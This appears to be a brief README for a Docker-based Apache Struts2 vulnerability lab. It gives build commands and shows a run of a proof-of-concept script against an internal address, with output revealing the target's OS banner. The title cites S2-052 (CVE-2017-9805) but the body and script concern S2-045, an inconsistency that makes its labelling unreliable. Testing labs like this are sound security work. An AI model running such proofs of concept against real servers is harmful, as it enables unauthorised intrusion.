##S2-052（CVE-2017-9805）

struts2 045 
https://struts.apache.org/docs/security-bulletins.html

## 测试环境搭建

```
docker-compose build
docker-compose up -d
```


##POC
```
执行测试
 python s2-045-poc.py http://10.160.11.191:8080/
[vulnerability exist] http://10.160.11.191:8080/
struts2-045
Debian GNU/Linux 9 \n \l

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<html>
<head>
    <META HTTP-EQUIV="Refresh" CONTENT="0;URL=example/HelloWorld.action">
</head>

<body>
<p>Loading ...</p>
</body>
</html>
```